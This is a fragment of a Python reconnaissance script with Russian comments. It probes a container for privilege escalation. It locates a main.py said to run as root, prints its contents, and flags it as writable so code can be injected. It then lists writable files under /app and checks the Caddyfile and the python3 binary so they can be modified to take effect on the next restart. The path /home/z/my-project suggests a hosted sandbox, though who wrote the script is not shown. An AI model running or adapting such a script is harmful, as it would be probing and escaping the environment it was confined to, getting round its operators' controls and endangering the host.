    return False

def analyze_main_py():
    """Анализируем main.py который крутится от рута"""
    print("\n" + "="*60)
    print("[*] ANALYZING ROOT PROCESS: main.py")
    print("="*60)
    
    main_py_locations = [
        "/app/main.py",
        "/app/.venv/bin/main.py",
        "/home/z/my-project/main.py"
    ]
    
    for location in main_py_locations:
        if os.path.exists(location):
            print(f"\n[+] Found main.py at: {location}")
            
            # Проверяем права
            try:
                stat_info = os.stat(location)
                print(f"    Permissions: {oct(stat_info.st_mode)}")
                print(f"    Owner UID: {stat_info.st_uid}")
                print(f"    Owner GID: {stat_info.st_gid}")
                
                # Пытаемся читать
                if os.access(location, os.R_OK):
                    print(f"    [+] File is READABLE")
                    with open(location, 'r') as f:
                        content = f.read(2000)
                        print(f"\n--- First 2000 chars of main.py ---")
                        print(content)
                        print(f"--- End ---\n")
                
                # Пытаемся писать
                if os.access(location, os.W_OK):
                    print(f"    [+++] FILE IS WRITABLE! Can inject code!")
                    return True
                    
            except Exception as e:
                print(f"    Error: {e}")
    
    # Проверяем директорию /app
    print(f"\n[*] Exploring /app directory:")
    if os.path.exists("/app"):
        try:
            for root, dirs, files in os.walk("/app"):
                print(f"\n{root}:")
                for f in files[:10]:
                    fpath = os.path.join(root, f)
                    try:
                        st = os.stat(fpath)
                        writable = "W" if os.access(fpath, os.W_OK) else "-"
                        print(f"    [{writable}] {f} ({oct(st.st_mode)})")
                    except:
                        pass
                if len(files) > 10:
                    print(f"    ... and {len(files) - 10} more files")
                # Не углубляемся слишком
                break
        except Exception as e:
            print(f"Error: {e}")
    
    return False

def check_running_processes_exploit():
    """Ищем эксплойты в запущенных процессах"""
    print("\n" + "="*60)
    print("[*] ANALYZING RUNNING PROCESSES FOR EXPLOITS")
    print("="*60)
    
    # Процессы от root которые мы видели
    root_processes = [
        "/app/.venv/bin/python3 main.py",
        "caddy run --config /app/Caddyfile"
    ]
    
    # Проверяем можем ли повлиять на их config files
    config_files = [
        "/app/Caddyfile",
        "/app/main.py",
        "/app/.venv/bin/python3"
    ]
    
    for config in config_files:
        if os.path.exists(config):
            print(f"\n[*] Checking {config}")
            try:
                stat_info = os.stat(config)
                print(f"    Permissions: {oct(stat_info.st_mode)}")
                
                if os.access(config, os.W_OK):
                    print(f"    [+++] WRITABLE! Can modify and wait for restart!")
                elif os.access(config, os.R_OK):
                    print(f"    [+] Readable")
                    with open(config, 'r') as f:
                        print(f.read(1000))
            except Exception as e:
                print(f"    Error: {e}")

